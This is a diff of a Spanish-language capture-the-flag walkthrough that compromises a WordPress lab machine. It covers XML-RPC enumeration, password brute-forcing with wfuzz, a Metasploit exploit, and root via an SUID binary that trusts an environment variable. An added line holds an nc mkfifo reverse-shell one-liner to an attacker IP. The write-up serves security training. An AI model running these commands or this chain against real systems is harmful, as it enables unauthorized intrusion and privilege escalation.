@@ -69,12 +69,14 @@ Seguimos enumerando y encontramos que efectivamente existe el archivo `/xmlrpc.p
 Pues lo unico que debemos hacer aca para poder [enumerar](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#xml-rpc) ciertas cosas con esta API, podemos hacer uso de `burpsuite` donde activamos el proxy, interceptamos una actualizacion de esta pagina, nos mandamos la peticion a la opcion `Repeater`, damos `2do Click` y usamos `Change request Method` para cambiar la peticion a `POST`, y luego ya solo queda modificar el cuerpo de la peticion, por ejemplo podemos mostrar los metodos disponibles a llamar con:
 ```xml
 <methodCall>
-<methodName>
-system.listMethods
-</methodName>
+	<methodName>
+		system.listMethods
+	</methodName>
 </methodCall>
 ```
 ![image](https://user-images.githubusercontent.com/85322110/149643483-90ecadf0-518d-40e9-bb11-93d92cedbda0.png)
+
+## ESCANEO
 
 Vemos de ultimo en la lista que tenemos disponible el metodo `wp.getUsersBlogs` con el cual podremos utilizarlo para probar por fuera bruta `bruteforce` las claves de estos dos usuarios que nos encontramos. Para esto existen diferentes maneras, tenemos `burpsuite` que con licencia pro hace funcion de `Intruder` por hilos, tenemos `wpscan` que tambien tiene un modulo de fuerza bruta, tambien podriamos hacer uso de herramientas de fuzzing como `wfuzz`, o incluso desde un script en `bash` usando el paquete `curl`, sin embargo vemos que esta maquina es altamente susceptible a DoS si se envian muchas peticiones, asi que en este caso tiraremos de `wfuzz` sin agregar muchos hilos usando lo siguiente:
 
@@ -117,14 +119,16 @@ Una vez aca podemos buscar el mismo exploit con `search wordpress 5.0` y anotamo
 ![image](https://user-images.githubusercontent.com/85322110/149840827-0f2f5912-a4b5-4422-abd1-5031da93367a.png)
 
 Ya con todo configurado, procemos a escribir `exploit` y darle enter:
+![image](https://user-images.githubusercontent.com/85322110/149841372-018ac92e-fa7e-4dc7-aadc-4fc592120d7f.png)
 
-
-## ESCANEO
-
+Aca ya tenemos ejecucion de comandos de manera remota con el servidor y logramos el acceso inicial, seguimos con la siguiente fase...
 
 ## ESCALADA DE PRIVILEGIOS
 
-Una vez tenemos acceso, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion:
+Hemos obtenido acceso con una consola del tipo `meterpreter`, pero a modo de comodidad pasamos a crearnos una `reverse shell` con `nc` como estamos acostumbramos, para ello escribimos `shell` en meterpreter para ejecutar una consola de sistema operativo, luego nos ponemos en escucha por otra ventana de `bash` con `sudo nc -nvlp 443` y desde la consola del sistema remoto usamos el siguiente [metodo de reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.33.130 443 >/tmp/f`{:.language-bash .highlight}
+
+Una vez obtenemos esta consola remota de bash, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion:
 
 - `script /dev/null -c bash`{:.language-bash .highlight}
 - En teclado `Ctrl + Z`
@@ -135,5 +139,14 @@ Una vez tenemos acceso, lo primero que podemos hacer es obtener una consola mas 
 - `export TERM=xterm`{:.language-bash .highlight}
 
 Ya con esto tenemos una consola interactiva con la cual procedemos a seguir investigando en como ganar privilegios de `root`.
+
+Podemos intentar obtener la flag de `user.txt` que la encontramos en `/home/bjoel/user.txt` pero nos topamos con que es una burla y no se encuentra alli, vemos un archivo PDF que es una carta de despido para Billy indicando que usaba dispositivos USB lo cual no estaba permitido en esa empresa.
+
+Si seguimos buscando formas de obtener credenciales elevadas, al usar `find / -perm -4000 2>/dev/null` para ver los binarios con [SUID](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/), notamos que hay uno que sobresale de la lista, pues esta en una carpeta donde no hay otros binarios SUID, en `/usr/sbin/checker`, al ejecutarlo solo nos dice que somos admin, pero si usamos `ltrace` para ejecutarlo vemos que hace uso de la funcion `getenv()` lo cual intenta buscar una variable de entorno llamada `admin`:
+
+
+Probamos hacer `export admin='test'` y ejecutamos el binario de nuevo y efectivamente ya tenemos acceso root, de aca buscamos donde esta la flag `user.txt` y leemos la flag de `root.txt` y concluimos con esta maquina:
+
+
 
 Saludos!
